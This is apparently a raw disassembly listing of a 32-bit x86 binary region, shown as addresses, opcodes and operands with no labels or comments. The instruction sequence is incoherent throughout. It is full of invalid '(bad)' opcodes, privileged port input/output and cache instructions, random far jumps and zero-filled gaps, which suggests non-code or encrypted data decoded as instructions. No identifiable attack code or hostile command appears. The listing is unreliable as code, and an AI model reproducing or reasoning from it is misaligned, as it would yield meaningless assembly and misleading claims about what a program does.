  420d7a:	fimul  DWORD PTR [esi-0x25]
  420d7d:	add    al,0x5b
  420d7f:	nop
  420d80:	ins    DWORD PTR es:[edi],dx
  420d81:	inc    ebp
  420d82:	repnz pop ebp
  420d84:	jl     0x420dee
  420d86:	scas   al,BYTE PTR es:[edi]
  420d87:	(bad)  
  420d88:	rcr    BYTE PTR [eax+0x7be39e23],1
  420d8e:	push   edx
  420d8f:	pop    edx
  420d90:	mov    ss,WORD PTR [ebx]
  420d92:	ret    
  420d93:	scas   al,BYTE PTR es:[edi]
  420d94:	xor    eax,0x29e18a78
  420d99:	mov    ch,0x91
  420d9b:	or     BYTE PTR [ecx-0x5822bd51],dh
  420da1:	ds out 0x2f,al
  420da4:	out    0xc8,eax
  420da6:	push   edi
  420da7:	ss scas al,BYTE PTR es:[edi]
  420da9:	adc    al,0x8c
  420dab:	std    
  420dac:	scas   eax,DWORD PTR es:[edi]
  420dad:	sub    eax,0x306ede31
  420db2:	in     eax,0x80
  420db4:	mov    dl,0x45
  420db6:	wbinvd 
  420db8:	test   DWORD PTR [edi-0x6d],0x856f8b47
  420dbf:	inc    ebp
  420dc0:	dec    ecx
  420dc1:	push   esi
  420dc2:	test   BYTE PTR [edi-0x12e50778],0x9b
  420dc9:	cwde   
  420dca:	pusha  
  420dcb:	or     BYTE PTR [eax+ebx*2],bh
  420dce:	inc    ecx
  420dcf:	aad    0x82
  420dd1:	mov    ecx,0x719dd68a
  420dd6:	sub    ah,BYTE PTR [edx+0x218ccf57]
  420ddc:	aaa    
  420ddd:	retf   0xc752
  420de0:	and    BYTE PTR ds:0x7d0f45ef,0x3c
  420de7:	stos   BYTE PTR es:[edi],al
  420de8:	idiv   BYTE PTR [edx+0x2]
  420deb:	(bad)  
  420dec:	adc    eax,0x46d5228e
  420df1:	(bad)  
  420df2:	push   0x9f538392
  420df7:	out    dx,eax
  420df8:	outs   dx,DWORD PTR ds:[esi]
  420df9:	in     al,0xad
  420dfb:	and    al,BYTE PTR [eax-0x69]
  420dfe:	sbb    al,BYTE PTR [edx+0x78]
  420e01:	mov    al,ds:0xef0f2dbf
  420e06:	je     0x420db2
  420e08:	out    0x66,al
  420e0a:	push   edi
  420e0b:	mov    dl,0x3d
  420e0d:	xor    cl,BYTE PTR [ebp+0x54]
  420e10:	lods   eax,DWORD PTR ds:[esi]
  420e11:	je     0x420e46
  420e13:	or     bl,al
  420e15:	sub    DWORD PTR [ecx+0x73068fd7],esi
  420e1b:	push   es
  420e1c:	or     bl,BYTE PTR [eax]
  420e1e:	mov    ch,BYTE PTR [ebx-0x6dfb59a8]
  420e24:	enter  0x587c,0x63
  420e28:	ss mov ebx,0xd3da092e
  420e2e:	and    BYTE PTR [ebx-0x395bbf79],al
  420e34:	and    BYTE PTR [edi],cl
  420e36:	ins    DWORD PTR es:[edi],dx
  420e37:	sub    BYTE PTR gs:[edi],dh
  420e3a:	jnp    0x420e1a
  420e3c:	aam    0xd1
  420e3e:	mov    ah,0xc7
  420e40:	cwde   
  420e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e42:	or     eax,0x27fa4461
  420e47:	pop    ecx
  420e48:	xchg   ebp,eax
  420e49:	sub    eax,0xdb8f423
  420e4e:	push   es
  420e4f:	xchg   edx,eax
  420e50:	sub    ch,ch
  420e52:	out    0x2c,eax
  420e54:	(bad)  
  420e55:	ds es pop esi
  420e58:	add    DWORD PTR [esi+0x7e],edx
  420e5b:	and    eax,0xacaa98a4
  420e60:	pop    ebp
  420e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e62:	push   es
  420e63:	lahf   
  420e64:	pop    ebx
  420e66:	cmp    DWORD PTR [ebp-0x4aa48f67],ebp
  420e6c:	imul   edi,esi,0x10
	...
  420e77:	add    BYTE PTR [eax],al
  420e79:	add    BYTE PTR [eax-0x77],bh
  420e7c:	hlt    
  420e7d:	mov    al,0xf5
  420e7f:	std    
  420e80:	jl     0x420e4b
  420e82:	xor    dl,0x39
  420e85:	jg     0x420e8d
  420e87:	pusha  
  420e88:	sbb    DWORD PTR [esp+edi*8-0x2fffe76],edx
  420e8f:	add    DWORD PTR [eax],eax
  420e91:	add    dh,dl
  420e93:	mov    ebp,0x92fe68e4
  420e98:	xor    eax,0xcc4a1c00
  420e9d:	das    
  420e9e:	mov    ebp,0x1a7b17b4
  420ea3:	pop    eax
  420ea4:	jno    0x420e85
  420ea6:	rcr    BYTE PTR [edi],1
  420ea8:	ret    
  420ea9:	ror    DWORD PTR [edx-0x2edabf87],1
  420eaf:	jecxz  0x420f13
  420eb1:	imul   edx,DWORD PTR [esi+0x2a],0xdd5d76e
  420eb8:	pusha  
  420eb9:	inc    DWORD PTR [edi-0x6c]
  420ebc:	and    BYTE PTR [esi+0x28],0xbf
  420ec0:	loopne 0x420ee5
  420ec2:	sahf   
  420ec3:	mov    esp,0x59536f87
  420ec8:	and    ebx,DWORD PTR [eax+0x1e2a7f7]
  420ece:	push   eax
  420ecf:	mov    ds:0xb7092a7e,al
  420ed4:	mov    edx,0xd6721e86
  420ed9:	leave  
  420eda:	dec    ebp
  420edb:	in     al,dx
  420edc:	add    bl,BYTE PTR [edi+edx*8-0x12]
  420ee0:	xchg   edi,eax
  420ee1:	cs lahf 
  420ee3:	loopne 0x420f15
  420ee5:	scas   eax,DWORD PTR es:[edi]
  420ee6:	or     BYTE PTR [ecx-0x20],ah
  420ee9:	repz jle 0x420f54
  420eec:	sbb    eax,0xbf2d24b5
  420ef1:	jb     0x420f4c
  420ef3:	pop    edx
  420ef4:	ins    BYTE PTR es:[edi],dx
  420ef5:	sbb    DWORD PTR [ebp-0x1b],edx
  420ef8:	shr    DWORD PTR [ebp-0x7ae1e793],1
  420efe:	rcl    DWORD PTR [eax],0x75
  420f01:	daa    
  420f02:	pop    esi
  420f03:	pop    esi
  420f04:	js     0x420f30
  420f06:	xor    eax,0xb8c9f287
  420f0b:	mov    ds:0x47c78c8e,al
  420f10:	xor    eax,0x7287daff
  420f15:	mov    ah,0xa9
  420f17:	addr16 xchg ecx,eax
  420f19:	and    al,0x6f
  420f1b:	jmp    0x420f38
  420f1d:	pop    esp
  420f1e:	fcomp  QWORD PTR [edx+edx*4]
  420f21:	fcmovbe st,st(4)
  420f23:	pushf  
  420f24:	pop    edx
  420f26:	mov    ds:0xdc8d9b7,eax
  420f2b:	shr    DWORD PTR [edi],1
  420f2d:	jmp    eax
  420f2f:	xor    eax,0xa4fffa80
  420f34:	lea    edi,ds:0xa769e819
  420f3a:	lahf   
  420f3b:	and    DWORD PTR [edi+eiz*1-0x4d03c],esp
  420f42:	xor    DWORD PTR [ecx-0x8],ebp
  420f45:	mov    ch,0xe7
  420f47:	mov    al,0x90
  420f49:	pop    esp
  420f4a:	xor    dh,bh
  420f4c:	xchg   DWORD PTR [edx+0x5aee08d9],ecx
  420f52:	xchg   esi,eax
  420f53:	sbb    eax,0x3a3f4e2e
  420f58:	cmp    DWORD PTR [edi+0x7ec0527],ebx
  420f5e:	adc    eax,0x886c2bcd
  420f63:	and    eax,0xe29ab41a
  420f68:	pushf  
  420f69:	in     eax,0x12
  420f6b:	cmp    esp,eax
  420f6d:	xor    edi,ebp
  420f6f:	mov    dh,BYTE PTR [eax+esi*2]
  420f72:	gs call 0xdd1:0xcc4a03f9
  420f7a:	or     al,0xce
  420f7c:	add    eax,0xd74899c6
  420f81:	popf   
  420f82:	inc    edi
  420f83:	pop    eax
  420f84:	push   0xa1ae5937
  420f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f8a:	test   DWORD PTR [esi+eiz*2+0x3],esi
  420f8e:	jnp    0x420ff5
  420f90:	push   ss
  420f91:	into   
  420f92:	fcmovu st,st(5)
  420f94:	pop    esi
  420f95:	dec    ebx
  420f96:	ja     0x420f6e
  420f98:	sbb    eax,DWORD PTR [ecx+0x6b1f3b79]
  420f9e:	push   esi
  420f9f:	or     eax,0xec5838ee
  420fa4:	and    edi,0xffffff93
  420fa7:	shl    DWORD PTR [esp],cl
  420faa:	out    0x16,al
  420fac:	ins    DWORD PTR es:[edi],dx
  420fad:	sub    bl,BYTE PTR [edi-0x5df31480]
  420fb3:	stos   DWORD PTR es:[edi],eax
  420fb4:	frstor [edi-0x40]
  420fb7:	aaa    
  420fb8:	std    
  420fb9:	fistp  QWORD PTR [edi-0x4b]
  420fbc:	repz rcr esp,cl
  420fbf:	dec    edi
  420fc0:	fsub   QWORD PTR [ebp-0x1c8ad0de]
  420fc6:	fcmove st,st(6)
  420fc8:	xor    eax,0x62b9edc
  420fcd:	cli    
  420fce:	xchg   ebx,eax
  420fcf:	(bad)  
  420fd1:	aad    0x38
  420fd3:	ss enter 0xa078,0x2b
  420fd8:	inc    edi
  420fd9:	imul   esi,DWORD PTR [edx-0x4c991d9b],0x247673a1
  420fe3:	mov    ebx,0x971c0b9e
  420fe8:	pop    ebx
  420fe9:	ret    
  420fea:	ret    
  420feb:	cld    
  420fec:	lock xchg edx,eax
  420fee:	test   ah,0xce
  420ff1:	jb     0x42103d
  420ff3:	adc    eax,0xd2eeb691
  420ff8:	jb     0x420f89
  420ffa:	sub    edx,esi
  420ffc:	adc    cl,BYTE PTR [ecx-0x6966cf61]
  421002:	mov    bl,0x29
  421004:	loope  0x42107e
  421006:	hlt    
  421007:	xor    al,0xa
  421009:	repz push esi
  42100b:	pusha  
  42100c:	jp     0x421083
  42100e:	or     DWORD PTR [edi-0x14a79657],0x33
  421015:	cld    
  421016:	loopne 0x421045
  421018:	loop   0x42106b
  42101a:	enter  0x3f1e,0xf
  42101e:	dec    esp
  42101f:	or     BYTE PTR [edi+0x1b],bh
  421022:	adc    edi,DWORD PTR [ebx+0x60890913]
  421028:	jae    0x420fc7
  42102a:	push   ds
  42102b:	scas   al,BYTE PTR es:[edi]
  42102c:	aaa    
  42102d:	ja     0x421021
  42102f:	aad    0x38
  421031:	jno    0x420fe7
  421033:	sahf   
  421034:	xor    al,0x9b
  421036:	fisub  DWORD PTR [ebp+0x26]
  421039:	pop    edx
  42103a:	cmp    eax,0x86e06644
  42103f:	xchg   DWORD PTR [ebx-0x60b98078],esp
  421045:	xchg   ecx,eax
  421046:	hlt    
  421047:	xchg   esi,eax
  421048:	scas   al,BYTE PTR es:[edi]
  421049:	adc    al,0xae
  42104b:	dec    eax
  42104c:	ins    DWORD PTR es:[edi],dx
  42104d:	je     0x42102b
  42104f:	inc    ebx
  421050:	lods   eax,DWORD PTR ds:[esi]
  421051:	daa    
  421052:	jmp    0x5c72baaa
  421057:	xchg   BYTE PTR [ecx+edx*4+0x7a06bddd],bl
  42105e:	ret    0xcc8a
  421061:	les    ebx,FWORD PTR [ecx+0x146f7f64]
  421067:	mov    edi,0xe0af9140
  42106c:	mov    ebx,esi
  42106e:	adc    ecx,0xffffff98
  421071:	fisub  WORD PTR [eax]
  421073:	xchg   DWORD PTR [ecx-0x5e],esp
  421076:	xor    BYTE PTR [edi],dl
  421078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421079:	adc    edx,DWORD PTR [ebx+eiz*4+0xef57f0b]
  421080:	cdq    
  421081:	dec    eax
  421082:	sub    cl,BYTE PTR [edi-0x5]
  421085:	sbb    bh,BYTE PTR [esi]
  421087:	div    esp
  421089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42108a:	mov    ecx,0x403e2c3d
	...
  421097:	add    BYTE PTR [eax],al
  421099:	add    BYTE PTR [edx+ecx*4-0x49],bl
  42109d:	imul   esi,edi,0x7f
  4210a0:	fdivr  QWORD PTR [edi+0x2b60ebfc]
  4210a6:	mov    eax,ds:0xf93891b3
  4210ab:	mov    WORD PTR [ecx],es
  4210ad:	add    ch,bh
  4210af:	add    DWORD PTR [eax],eax
  4210b1:	add    BYTE PTR [ebx],bh
  4210b3:	scas   al,BYTE PTR es:[edi]
  4210b4:	mov    esi,0x36571567
  4210b9:	cdq    
  4210ba:	sbb    BYTE PTR [esi-0x71],ah
  4210bd:	sbb    ebx,ecx
  4210bf:	aaa    
  4210c0:	push   ds
  4210c1:	lds    edx,FWORD PTR [esi-0x61]
  4210c4:	scas   eax,DWORD PTR es:[edi]
  4210c5:	sbb    eax,0xbc21514f
  4210ca:	aad    0xdb
  4210cc:	stos   BYTE PTR es:[edi],al
  4210cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210ce:	push   ds
  4210cf:	test   eax,0xf1082aa9
  4210d4:	test   BYTE PTR [ebx+0x48],bl
  4210d7:	ficom  DWORD PTR [ecx+0x23479921]
  4210dd:	adc    eax,0xf0945825
  4210e2:	mov    WORD PTR [esi+0x3e],?
  4210e5:	mov    esi,0xc418c137
  4210ea:	add    BYTE PTR [esi+esi*8-0x3],dl
  4210ee:	sar    esi,cl
  4210f0:	jl     0x4210ae
  4210f2:	mov    esp,0x86443cc
  4210f7:	aaa    
  4210f8:	pop    ds
  4210f9:	fcom   DWORD PTR [ebx+0xb]
  4210fc:	mov    DWORD PTR [esi],ecx
  4210fe:	mov    al,ds:0x3384dcdc
  421103:	mov    edi,0x4e6068fb
  421108:	and    eax,0x6a3acf83
  42110d:	inc    ecx
  42110e:	shr    DWORD PTR [ecx],0xda
  421111:	pop    esi
  421112:	clc    
  421113:	dec    eax
  421114:	pop    eax
  421115:	cmp    ah,al
  421117:	or     dl,BYTE PTR [eax+ecx*1]
  42111a:	mov    BYTE PTR [eax],ch
  42111c:	pusha  
  42111d:	jbe    0x42118d
  42111f:	leave  
  421120:	pop    esp
  421121:	xor    al,0xe4
  421123:	mov    edx,es
  421125:	xchg   DWORD PTR [ecx+0x11],ebx
  421128:	or     bh,BYTE PTR [edx]
  42112a:	inc    edx
  42112b:	aam    0x83
  42112d:	xor    BYTE PTR [eax-0x13],dl
  421130:	xor    ah,bl
  421132:	out    0xa0,al
  421134:	lea    eax,[eax+0x40990612]
  42113a:	mov    DWORD PTR [ecx-0x4e2c7dc7],ebp
  421140:	add    eax,0x9f800a55
  421145:	jmp    0x7ba9:0xcf54fb87
  42114c:	adc    dl,BYTE PTR [edi]
  42114e:	arpl   WORD PTR [eax+0x21],bp
  421151:	aas    
  421152:	jg     0x4211a4
  421154:	retf   0x13a8
  421157:	imul   ebp,DWORD PTR [eax],0x844b654d
  42115d:	inc    eax
  42115e:	xchg   esp,eax
  42115f:	dec    BYTE PTR [edx-0x49aec6b2]
  421165:	js     0x421112
  421167:	xor    BYTE PTR [eax],ah
  421169:	mov    bl,0xef
  42116b:	shl    BYTE PTR [edi-0x50e0ca3b],0xc5
  421172:	lea    edi,[ecx+0x23c16f35]
  421178:	cli    
  421179:	(bad)  
  42117c:	xor    eax,0x70bae9c6
  421181:	push   0xffffff99
  421183:	sbb    cl,BYTE PTR [esi-0xa]
  421186:	test   BYTE PTR [edx-0x74],0x3e
  42118a:	mov    al,0x63
  42118c:	pop    ds
  42118d:	mov    ch,0x40
  42118f:	jo     0x421158
  421191:	fwait
  421192:	mov    bl,0x53
  421194:	scas   eax,DWORD PTR es:[edi]
  421195:	dec    edx
  421196:	ds push es
  421198:	sub    al,0xbb
  42119a:	call   0xe286:0xc45bf9d0
  4211a1:	dec    ebx
  4211a2:	aas    
  4211a3:	into   
  4211a4:	imul   esp,DWORD PTR ds:0x2752b29,0x50fcceff
  4211ae:	pushf  
  4211af:	mov    dl,0x14
  4211b1:	jae    0x4211db
  4211b3:	mov    eax,ds:0xba91c003
  4211b8:	cmp    BYTE PTR [ebx-0x29],ah
  4211bb:	mov    al,ds:0x73b5719d
  4211c0:	dec    edi
  4211c1:	aas    
  4211c2:	leave  
  4211c3:	(bad)  
  4211c4:	nop
  4211c5:	push   esi
  4211c6:	and    BYTE PTR ds:0x28ed19c7,cl
  4211cc:	sub    al,0x5c
  4211ce:	and    eax,DWORD PTR [edx+0x2]
  4211d1:	xchg   ebx,eax
  4211d2:	pop    edx
  4211d3:	xchg   esp,eax
  4211d4:	pop    edi
  4211d5:	popf   
  4211d6:	jp     0x421231
  4211d8:	pop    esi
  4211d9:	js     0x42117d
  4211db:	mov    al,ds:0xb3ef312b
  4211e0:	push   es
  4211e1:	and    BYTE PTR [edi-0x2013d5ef],0x5c
  4211e8:	imul   edi
  4211ea:	mov    eax,ds:0x86b483e8
  4211ef:	mov    bh,0x3b
  4211f1:	pop    esp
  4211f2:	das    
  4211f3:	stc    
  4211f4:	push   edx
  4211f5:	(bad)  
  4211f6:	out    0x87,eax
  4211f8:	stos   BYTE PTR es:[edi],al
  4211f9:	push   0x457655c9
  4211fe:	or     eax,0xa74f97f3
  421203:	addr16 cmp al,0xf7
  421206:	cmp    dl,BYTE PTR [ebx]
  421208:	or     eax,0x1f545082
  42120d:	inc    BYTE PTR [ebp+0x6c111815]
  421213:	or     bl,dh
  421215:	adc    eax,0xac86f657
  42121a:	inc    ecx
  42121b:	fwait
  42121c:	mov    ebp,0x2da4cefa
  421221:	mov    bh,0xe9
  421223:	adc    bh,BYTE PTR [edi-0x19e637fb]
  421229:	mov    ch,0x42
  42122b:	xchg   ecx,eax
  42122c:	ret    
  42122d:	das    
  42122e:	jbe    0x4212a2
  421230:	inc    ecx
  421231:	fwait
  421232:	xchg   edi,eax
  421233:	mov    ah,0x5e
  421235:	jmp    0xf06a:0x48aabc8f
  42123c:	and    al,0x6
  42123e:	or     BYTE PTR ds:0x187a586a,dh
  421244:	(bad)  
  421245:	retf   
  421246:	lods   eax,DWORD PTR ds:[esi]
  421247:	dec    esi
  421248:	add    edx,0xffffffe3
  42124b:	jge    0x42127d
  42124d:	test   al,0x6d
  42124f:	push   ebx
  421250:	and    al,0x96
  421252:	or     eax,0xd8437f32
  421257:	(bad)  
  421258:	aaa    
  421259:	and    dh,cl
  42125b:	mov    ecx,0x2a9d0f75
  421260:	ja     0x4211ed
  421262:	(bad)  
  421263:	into   
  421264:	xchg   bl,dl
  421266:	not    DWORD PTR [edx]
  421268:	cmp    eax,0x124314fe
  42126d:	pop    edi
  42126e:	adc    al,0xb9
  421270:	mov    al,ds:0xb9933dfd
  421275:	push   ecx
  421276:	add    DWORD PTR [eax+ebp*2+0x3e],ebp
  42127a:	xchg   edx,eax
  42127b:	stos   BYTE PTR es:[edi],al
  42127c:	add    BYTE PTR [esi-0x122b8c01],0x6f
  421283:	mov    al,0x35
  421285:	ret    0xa493
  421288:	into   
  421289:	sbb    ch,dh
  42128b:	in     eax,0xd8
  42128d:	adc    ebx,edi
  42128f:	pusha  
  421290:	dec    eax
  421291:	jmp    0x8746:0xf4c99ebe
  421298:	dec    eax
  421299:	into   
  42129a:	mov    es,WORD PTR [edx-0x65]
  42129d:	mov    ecx,0x9180579d
  4212a2:	test   esp,ebx
  4212a4:	pop    ebp
  4212a5:	fdiv   QWORD PTR [edx-0x1fa2fe9e]
  4212ab:	jp     0x4212c3
  4212ad:	mov    esi,0xf2
	...
  4212ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212bb:	sbb    al,BYTE PTR [edi-0x204026]
  4212c1:	jg     0x42132a
  4212c3:	pop    esp
  4212c4:	fstp   DWORD PTR [ecx-0xb63c965]
  4212ca:	test   BYTE PTR [esi+0x1fd0001],0x0
  4212d1:	add    BYTE PTR [edx],dh
  4212d3:	in     al,dx
  4212d4:	das    
  4212d5:	inc    edx
  4212d6:	mov    WORD PTR [edx+0x68],ss
  4212d9:	mov    esi,0x737bbf7f
  4212de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212df:	lods   al,BYTE PTR ds:[esi]
  4212e0:	sbb    edx,DWORD PTR [edi]
  4212e2:	lahf   
  4212e3:	jl     0x421297
  4212e5:	stc    
  4212e6:	into   
  4212e7:	out    0xc2,al
  4212e9:	sti    
  4212ea:	pop    ebp
  4212eb:	call   0xe01d:0xfd94d0da
  4212f2:	popf   
  4212f3:	jnp    0x4212b3
  4212f5:	sub    BYTE PTR [eax+ebx*8-0x4627784],bh
  4212fc:	cmp    BYTE PTR [ebx-0x33],dl
  4212ff:	add    al,0xc6
  421301:	pop    esp
  421302:	(bad)  
  421304:	ja     0x4212fa
  421306:	adc    eax,0xa7a9df47
  42130b:	loopne 0x421304
  42130d:	mov    dh,0x99
  42130f:	mov    eax,0x8aeaabd9
  421314:	add    al,0x16
  421316:	ja     0x421367
  421318:	icebp  
  421319:	sub    al,0x7c
  42131b:	ja     0x4212cd
  42131d:	cmc    
  42131e:	jecxz  0x421369
  421320:	inc    esp
  421321:	jle    0x4212cf
  421323:	jns    0x4212ff
  421325:	sahf   
  421326:	lea    edi,[esi]
  421328:	jbe    0x4212aa
  42132a:	stos   BYTE PTR es:[edi],al
  42132b:	in     eax,0xd2
  42132d:	sahf   
  42132e:	aaa    
  42132f:	dec    esi
  421330:	(bad)  
  421331:	xchg   ecx,eax
  421332:	adc    dl,BYTE PTR [ecx+0x1c678234]
  421338:	ret    0x91c7
  42133b:	jmp    0x15d5:0x53d59925
  421342:	cmp    eax,0x99bf085
  421347:	test   DWORD PTR [bx+si],esi
  42134a:	jge    0x421309
  42134c:	inc    eax
  42134d:	addr16 xchg edx,eax
  42134f:	xchg   BYTE PTR [ecx],dh
  421351:	mov    ds:0xfa63a03e,al
  421356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421357:	fnsave [ecx+0x44]
  42135a:	ret    
  42135b:	cmp    eax,DWORD PTR [edx+0x7c7689ae]
  421361:	cmp    BYTE PTR [eax+0x8],ah
  421364:	cmp    BYTE PTR [edx-0x27],0xb6
  421368:	mov    al,0x6d
  42136a:	std    
  42136b:	stos   BYTE PTR es:[edi],al
  42136c:	sub    al,0x0
  42136e:	mov    edi,0x1e6e7470
  421373:	bound  esp,QWORD PTR [ecx+0x46]
  421376:	fs sbb BYTE PTR ss:[eax-0x56],bh
  42137b:	dec    BYTE PTR [edi-0x42d5e187]
  421381:	fst    DWORD PTR [eax-0xed2c0c6]
  421387:	jmp    DWORD PTR [esi-0x7ffc1e99]
  42138d:	call   0x4ea3:0xf89c7ac1
  421394:	cmp    eax,0xc500f2f0
  421399:	or     dl,BYTE PTR [ebx+0x48c67cc2]
  42139f:	xchg   ebx,eax
  4213a0:	mov    cl,0xd8
  4213a2:	add    eax,0x6f2d4046
  4213a7:	in     al,0x96
  4213a9:	or     BYTE PTR [ecx+0x315741ff],cl
  4213af:	push   es
  4213b0:	aaa    
  4213b1:	gs jae 0x42137f
  4213b4:	pop    eax
  4213b5:	ret    0xaaa9
  4213b8:	imul   ebp,DWORD PTR [eax],0x8de1c089
  4213be:	imul   ebx,DWORD PTR [edx+0x36],0xffffffa4
  4213c2:	mov    esp,DWORD PTR [edx+0x19adf8e9]
  4213c8:	mov    DWORD PTR [esi],eax
  4213ca:	arpl   WORD PTR [ecx+0x731c0ec9],bx
  4213d0:	push   ebp
  4213d1:	lods   eax,DWORD PTR ds:[esi]
  4213d2:	xchg   ecx,eax
  4213d3:	sub    dl,dl
  4213d5:	repnz fndisi(8087 only) 
  4213d8:	pusha  
  4213d9:	jp     0x421369
  4213db:	push   ds
  4213dc:	cs pop ebp
  4213de:	(bad)  
  4213df:	aad    0x7a
  4213e1:	jmp    0xfae2:0x120b786d
  4213e8:	adc    al,0xa1
  4213ea:	(bad)  
  4213eb:	rcr    dl,0xea
  4213ee:	push   ebx
  4213ef:	bound  ecx,QWORD PTR [eax+0x42875f1f]
  4213f5:	or     al,0x78
  4213f7:	dec    ecx
  4213f8:	lods   eax,DWORD PTR ds:[esi]
  4213f9:	or     DWORD PTR [ecx],edx
  4213fb:	inc    eax
  4213fc:	inc    esp
  4213fd:	jae    0x421431
  4213ff:	jns    0x42144b
  421401:	cmp    bl,BYTE PTR [edx-0x47]
  421404:	push   esp
  421405:	inc    ebx
  421406:	cli    
  421407:	cmp    esp,DWORD PTR [esi-0x7acd3dd1]
  42140d:	mov    cl,0x32
  42140f:	sub    BYTE PTR [esi],al
  421411:	test   DWORD PTR es:[eax-0x42],edi
  421415:	push   ebp
  421416:	in     eax,0xe6
  421418:	pop    ecx
  421419:	adc    BYTE PTR [edi],ah
  42141b:	jp     0x4213e7
  42141d:	les    esp,FWORD PTR [eax+0x1bc9de04]
  421423:	sub    esp,ebx
  421425:	push   ebx
  421426:	ss mov dl,0x71
  421429:	inc    edx
  42142a:	sub    DWORD PTR [ebx+0x6],esp
  42142d:	pop    ecx
  42142e:	dec    ebx
  42142f:	jmp    0x28b38c92
  421434:	inc    edi
  421435:	pop    ds
  421436:	inc    esp
  421437:	xor    DWORD PTR [edi+0x8],eax
  42143a:	iret   
  42143b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42143c:	mov    cl,0xc2
  42143e:	mov    bl,0x3a
  421440:	dec    ebp
  421441:	bound  ecx,QWORD PTR [esi+ecx*2]
  421444:	stos   DWORD PTR es:[edi],eax
  421445:	cmp    DWORD PTR [ebx-0x2df44fbf],edi
  42144b:	mov    BYTE PTR [ebp+edx*8-0x75],ah
  42144f:	aad    0x81
  421451:	adc    ch,0x9f
  421454:	jbe    0x421446
  421456:	hlt    
  421457:	ja     0x421421
  421459:	mov    ds:0xbad09d7d,eax
  42145e:	stos   BYTE PTR es:[edi],al
  42145f:	popf   
  421460:	and    eax,0xb8dcf057
  421465:	cmp    edi,DWORD PTR [ebx+eiz*2+0x7bef90c0]
  42146c:	pop    es
  42146d:	jbe    0x4214e5
  42146f:	cmp    DWORD PTR [edx],0x49ca9b76
  421475:	test   al,0xfd
  421477:	jae    0x4214ad
  421479:	aas    
  42147a:	push   edx
  42147b:	sbb    esp,DWORD PTR [esi-0x588f8f5]
  421481:	xor    DWORD PTR [eax],esp
  421483:	dec    ebp
  421484:	dec    ecx
  421485:	out    dx,eax
  421486:	and    cl,BYTE PTR [eax+0x2d7ff872]
  42148c:	xchg   esi,eax
  42148d:	and    BYTE PTR [ebp+eiz*4+0x58de7e2],0x7c
  421495:	aad    0xc4
  421497:	pop    ebp
  421498:	ds dec ebx
  42149a:	fwait
  42149b:	in     al,0x4
  42149d:	xor    eax,0x33ef93e
  4214a2:	pop    es
  4214a3:	mov    bl,0x77
  4214a5:	sbb    eax,0xccc0da8b
  4214aa:	xchg   edx,eax
  4214ab:	pop    edx
  4214ac:	mov    dh,0x68
  4214ae:	test   ah,0x7c
  4214b1:	cs add edx,ecx
  4214b4:	sbb    eax,ebp
  4214b6:	mov    ch,0x83
  4214b8:	repz xchg edx,eax
  4214ba:	mov    edi,0xdfe99ae6
  4214bf:	add    dl,bl
  4214c1:	sbb    BYTE PTR [esi+0x12bb5a2c],bh
  4214c7:	les    eax,FWORD PTR [edi+0x4a13d728]
  4214cd:	into   
  4214ce:	and    al,0x0
	...
  4214d8:	add    BYTE PTR [eax],al
  4214da:	popf   
  4214db:	paddd  mm4,QWORD PTR [esi+edi*8-0x5bc0200b]
  4214e3:	fidiv  DWORD PTR [ebp+0x34]
  4214e6:	mov    edi,0xf3795a63
  4214eb:	nop
  4214ec:	add    DWORD PTR [eax],eax
  4214ee:	std    
  4214ef:	add    DWORD PTR [eax],eax
  4214f1:	add    BYTE PTR [esi],ch
  4214f3:	mov    eax,ds:0xf0155127
  4214f8:	popf   
  4214f9:	jne    0x4214b6
  4214fb:	ret    0x7013
  4214fe:	test   al,0xc1
  421500:	xchg   esi,eax
  421501:	or     ch,bl
  421503:	std    
  421504:	push   0x23f537e7
  421509:	sti    
  42150a:	sub    eax,0x4563011e
  42150f:	xor    al,0x74
  421511:	out    0x53,eax
  421513:	mov    ebp,0x3fb5c18e
  421518:	imul   esp,DWORD PTR [edx],0xffffff96
  42151b:	cli    
  42151c:	cs retf 0x20f0
  421520:	push   ds
  421521:	cmc    
  421522:	cmp    bl,BYTE PTR [ebp-0x13]
  421525:	dec    edx
  421526:	sub    ah,ch
  421528:	xchg   esi,eax
  421529:	dec    edx
  42152a:	aas    
  42152b:	cld    
  42152c:	xor    dl,bh
  42152e:	sub    al,bl
  421530:	hlt    
  421531:	and    al,0x8d
  421533:	dec    ebp
  421534:	push   eax
  421535:	add    al,0xfa
  421537:	xchg   ecx,eax
  421538:	add    DWORD PTR [eax+0x4a],eax
  42153b:	mov    edi,0xf4296025
  421540:	lods   eax,DWORD PTR ds:[esi]
  421541:	pop    edi
  421542:	lds    ecx,FWORD PTR [ebx+0x7c]
  421545:	pushf  
  421546:	ja     0x4214ed
  421548:	icebp  
  421549:	into   
  42154a:	sti    
  42154b:	cs mov esp,0x6696f569
  421551:	fadd   st,st(0)
  421553:	rcr    BYTE PTR [ecx+0x34e63f88],1
  421559:	inc    eax
  42155a:	push   ebp
  42155b:	sub    BYTE PTR [ebx+0x5f5da2bb],bl
  421561:	mov    edi,0x78db3a9d
  421566:	das    
  421567:	push   esi
  421568:	xchg   BYTE PTR [esi],dl
  42156a:	mov    dh,0x12
  42156c:	xchg   ebx,eax
  42156d:	xchg   ebp,eax
  42156e:	sti    
  42156f:	add    al,0xe4
  421571:	sub    DWORD PTR [edx],0x2afda189
  421577:	(bad)  
  421578:	pop    ss
  421579:	mov    al,0x94
  42157b:	adc    al,0xea
  42157d:	inc    edi
  42157e:	xchg   esp,eax
  42157f:	add    DWORD PTR [ecx-0x39f1dcf9],esi
  421585:	mov    ebx,0x1d9541af
  42158a:	out    dx,eax
  42158b:	adc    edi,edi
  42158d:	mov    ecx,0x5fc50d2c
  421592:	lea    esp,[ecx-0x59]
  421595:	sbb    DWORD PTR [edx-0x3c],eax
  421598:	jnp    0x42158f
  42159a:	xor    DWORD PTR [edi-0x5a],ebx
  42159d:	pop    ebx
  42159f:	jno    0x4215b0
  4215a1:	push   edi
  4215a2:	ret    0x500
  4215a5:	jecxz  0x421551
  4215a7:	or     cl,bl
  4215a9:	lods   eax,DWORD PTR ds:[esi]
